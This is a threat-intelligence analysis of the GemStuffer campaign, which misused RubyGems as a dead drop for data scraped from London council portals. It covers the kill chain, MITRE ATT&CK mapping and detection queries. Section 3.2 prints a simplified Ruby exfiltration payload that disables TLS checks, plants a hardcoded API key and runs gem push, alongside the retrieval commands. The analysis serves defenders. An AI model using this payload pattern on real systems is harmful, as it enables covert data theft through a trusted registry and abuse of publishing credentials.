# GemStuffer ; RubyGems as Exfiltration Channel

**Campaign Name:** GemStuffer
**No CVE assigned** ; novel exfiltration technique, not a traditional vulnerability
**Analysis Date:** 2026-05-14
**Discovered By:** Socket Threat Research Team
**Campaign Active:** May 2026
**Target:** UK local government democratic services portals (Lambeth, Wandsworth, Southwark)
**Ecosystem:** RubyGems
**Packages Deployed:** 150+ gems
**Registry Response:** RubyGems temporarily disabled new account registration, 500+ packages yanked
**Technique:** Registry-as-dead-drop data exfiltration

---

## 1. Executive Summary

GemStuffer is a novel supply chain campaign that targets the RubyGems package registry with an unusual objective: not to compromise developers who install the packages, but to use the registry itself as a data exfiltration dead drop.

Over 150 gems were published by bot accounts. Each package contained scripts that scraped pages from UK local government democratic services portals ; specifically council calendar pages, agenda listings, and committee links from Lambeth, Wandsworth, and Southwark councils in London. The scraped data was packaged into valid .gem archives and published back to RubyGems using hardcoded API keys. The attacker could then retrieve the data at any time by fetching the gem.

GemStuffer represents a meaningful shift in how package registries can be abused. Traditional supply chain attacks use registries to deliver malware to developers. GemStuffer demonstrates that registries can also serve as persistent, globally accessible data stores ; effectively turning a trusted developer infrastructure into a covert exfiltration channel that blends into normal developer traffic.

RubyGems responded by disabling new account registrations and yanking 500+ malicious packages. The malicious activity has stopped according to RubyGems, though the underlying technique remains available to future threat actors.

| Property | Value |
|---|---|
| **Verdict** | Novel ; Registry-as-Exfiltration-Dead-Drop Supply Chain Campaign |
| **CVE** | None assigned |
| **Target** | UK local government portals |
| **Technique** | Scrape data, package as gem, publish to registry |
| **Detection Difficulty** | High ; traffic resembles normal gem publishing |
| **Registry Status** | 500+ packages yanked, account registration disabled |

---

## 2. Why This Campaign Is Significant

### 2.1 It Inverts the Traditional Threat Model

Standard supply chain attacks: malicious package on registry, developer installs it, developer machine compromised.

GemStuffer: malicious script runs somewhere, scrapes data, publishes exfiltrated data as gems. Developers who install the gems get junk packages with no download activity. The registry is not the delivery vehicle for malware ; it is the exfiltration destination.

The threat model assumption that package registries are dangerous because they deliver code to developers fails to account for this pattern.

### 2.2 The Registry Functions as a Persistent Dead Drop

Once data is published as a gem version, it is:
- Globally accessible from any internet-connected machine
- Authenticated by the gem name and version (hard to distinguish from legitimate packages without content inspection)
- Persistent until explicitly yanked
- Accessible via normal gem commands that would not trigger DLP or egress monitoring

```bash
# Attacker retrieves exfiltrated data:
gem fetch <gemname> -v <version>
tar xf *.gem data.tar.gz
cat lib/result.txt  # contains scraped council portal data
```

No custom C2 infrastructure. No unusual domain names. No unusual ports. Just gem fetch.

### 2.3 Registry Traffic Blends In

Security tooling that monitors for unusual outbound connections or domain lookups would not flag:
- HTTPS connections to rubygems.org (a trusted developer infrastructure domain)
- gem push or gem fetch commands (normal developer activity)
- Standard gem publishing API calls

---

## 3. Technical Analysis

### 3.1 Full Kill Chain

```
[Delivery: evil.rb or hack.rb dropped to target environment]
                        |
                        v
[Reconnaissance]
Capture Time.now, Dir.pwd, $0 (script path), ARGV
                        |
                        v
[UK Government Portal Scraping]
GET https://<council>/mgCalendarMonthView.aspx?M=1&Y=2026&GL=1&bcr=1
SSL verification disabled (VERIFY_NONE ; cert errors suppressed)
Full response body and HTTP status code captured
Target portals:
  - democracy.lambeth.gov.uk
  - moderngov.wandsworth.gov.uk
  - moderngov.southwark.gov.uk
                        |
                        v
[Malicious Gem Staging]
mkdir /tmp/<gemname><timestamp><pid>/lib/
binwrite stolen content to lib/result.txt
Write stub lib/x.rb and generate x.gemspec
                        |
                        v
[Credential Injection]
mkdir /tmp/gemhome/.gem/
Write hardcoded API key to .gem/credentials (chmod 0600)
Override ENV['HOME'] = '/tmp/gemhome'
                        |
                        v
[Exfiltration via Gem Push]
gem build x.gemspec -> <name>-<version>.gem
gem push <name>.gem --host https://rubygems.org
Stolen data now retrievable as a public gem version
                        |
                        v
[Attacker retrieves data]
gem fetch <name> -v <version>
tar xf *.gem data.tar.gz
Scraped council portal data accessed from anywhere
```

### 3.2 Payload Characteristics

```ruby
# Simplified representation of GemStuffer payload pattern

require 'net/http'
require 'openssl'
require 'fileutils'

# Reconnaissance
puts "Time: #{Time.now}, Path: #{Dir.pwd}, Script: #{$0}"

# Scrape UK council portal
uri = URI('https://democracy.lambeth.gov.uk/mgCalendarMonthView.aspx?M=1&Y=2026&GL=1&bcr=1')
http = Net::HTTP.new(uri.host, uri.port)
http.use_ssl = true
http.verify_mode = OpenSSL::SSL::VERIFY_NONE  # cert errors suppressed

response = http.get(uri.request_uri)
scraped_data = response.body

# Stage as gem
gem_dir = "/tmp/#{gemname}#{timestamp}#{$$}/lib/"
FileUtils.mkdir_p(gem_dir)
File.binwrite("#{gem_dir}result.txt", scraped_data)

# Inject hardcoded API credentials
FileUtils.mkdir_p('/tmp/gemhome/.gem/')
File.write('/tmp/gemhome/.gem/credentials', "---\n:rubygems_api_key: <HARDCODED_KEY>", perm: 0600)
ENV['HOME'] = '/tmp/gemhome'

# Exfiltrate by publishing as gem
system("gem build x.gemspec && gem push #{gemname}-#{version}.gem")
# Scraped data now globally accessible as a public gem version
```

### 3.3 Target Data

The scraped data from UK council portals included:
- Council calendar pages (meeting schedules, dates)
- Agenda listings (items under consideration by councils)
- Committee links and membership information
- Democratic services portal navigation and structure

The significance of this target selection is unclear. Possibilities include: OSINT gathering on local government decision-making, testing the technique against low-sensitivity targets before deploying against higher-value ones, or a reconnaissance operation mapping democratic services infrastructure.

Socket noted that the packages have little or no download activity. This is consistent with the campaign's goal: the gems are not designed to be installed. They are data containers.

---

## 4. Registry Response

RubyGems responded rapidly once the campaign was identified:

| Date | Action |
|---|---|
| May 13, 2026 | Socket Threat Research publishes GemStuffer analysis |
| May 13, 2026 | RubyGems disables new account registration |
| May 13, 2026 | "The malicious spam activity has stopped" ; RubyGems statement |
| May 13, 2026 | Bot accounts blocked and removed |
| May 13, 2026 | 500+ malicious packages yanked from registry |
| Ongoing | Coordinating with Fastly to enable WAF protection and tighten rate limiting |

Account sign-ups expected to remain closed for two to three days while infrastructure controls are implemented.

---

## 5. MITRE ATT&CK Mapping

| ID | Technique | Notes |
|---|---|---|
| T1195.001 | Supply Chain: Compromise Software Dependencies | 150+ gems on RubyGems |
| T1567.001 | Exfiltration to Code Repository | gem push to RubyGems as exfiltration channel |
| T1119 | Automated Collection | Scripted scraping of council portal pages |
| T1071.001 | Application Layer Protocol: Web | HTTPS to rubygems.org ; blends with normal traffic |
| T1078 | Valid Accounts | Hardcoded RubyGems API keys used for publishing |
| T1102 | Web Service | RubyGems registry used as C2/dead drop |

---

## 6. Detection Recommendations

### 6.1 For Organisations Running Ruby Infrastructure

```bash
# Audit recently installed gems for suspicious patterns
# Check gem contents for government portal scraping patterns
gem contents <gemname> | grep -i "result.txt\|mgCalendarMonthView"

# Check for gems with hardcoded API keys in their contents
find $(gem environment gemdir)/gems -name "*.rb" -exec \
  grep -l "rubygems_api_key\|VERIFY_NONE\|mgCalendarMonthView" {} \;

# Monitor gem publishing in CI/CD pipelines
# Unexpected gem push commands to rubygems.org are a detection signal
grep "gem push" /var/log/ci-cd/*.log 2>/dev/null

# Check for SSL verification disabled in Ruby code (VERIFY_NONE)
grep -r "VERIFY_NONE\|verify_mode = 0" /path/to/ruby/code
```

### 6.2 Network-Level Detection

```
# Alert on outbound HTTPS to rubygems.org from non-developer systems
# Particularly from servers, containers, or CI/CD runners during off-hours

# Alert on gem push API calls from unexpected sources
# The gem push endpoint: https://rubygems.org/api/v1/gems
alert https $INTERNAL_NET any -> rubygems.org 443 (
  msg:"GemStuffer Pattern: gem push from unexpected source";
  flow:to_server,established;
  http.uri; content:"/api/v1/gems";
  http.method; content:"POST";
  threshold:type limit, track by_src, count 5, seconds 60;
  classtype:policy-violation;
  sid:2026GEMSTUFFER01;
  rev:1;
)
```

### 6.3 KQL (Microsoft Sentinel)

```kusto
// GemStuffer Detection ; gem push to RubyGems from unexpected sources

// Detect gem push API calls from non-developer workstations
DeviceNetworkEvents
| where RemoteUrl has "rubygems.org/api/v1/gems"
| where InitiatingProcessFileName !in~ ("ruby", "gem", "bundler")
| project TimeGenerated, DeviceName, RemoteUrl, InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by TimeGenerated desc

// Detect Ruby scripts scraping government portals
DeviceNetworkEvents
| where RemoteUrl has_any ("gov.uk", "lambeth", "wandsworth", "southwark")
| where InitiatingProcessFileName in~ ("ruby", "ruby3")
| where RemoteUrl contains "mgCalendarMonthView"
| project TimeGenerated, DeviceName, RemoteUrl, InitiatingProcessFileName
| order by TimeGenerated desc
```

---

## 7. Broader Implications

### 7.1 The Registry-as-Dead-Drop Pattern Is Reusable

GemStuffer proved the technique against low-sensitivity data. The same approach works against any data:
- Internal application secrets scraped from a compromised environment
- Credentials harvested from memory
- Source code exfiltrated from a developer machine
- Any data an attacker wants to retrieve from multiple locations without custom C2

The only requirement is access to a package registry with an API key.

This pattern is not limited to RubyGems. The same technique works against npm, PyPI, crates.io, NuGet, or any other package registry that allows authenticated publishing.

### 7.2 DLP and Egress Monitoring Miss This

Traditional data loss prevention tools monitor for:
- Large file transfers to unusual destinations
- Uploads to file sharing services
- Email attachments containing sensitive data

They typically do not monitor for gem push commands to rubygems.org. The traffic is HTTPS to a trusted developer infrastructure domain. It looks identical to a developer publishing a legitimate package.

### 7.3 The Supply Chain Threat Model Needs Expanding

The security community has spent significant energy on the "malicious package installs malware on developer machine" threat model. GemStuffer demonstrates a second, orthogonal threat model: "package registry used as covert exfiltration infrastructure."

Both threat models are real. Both require different detection approaches.

---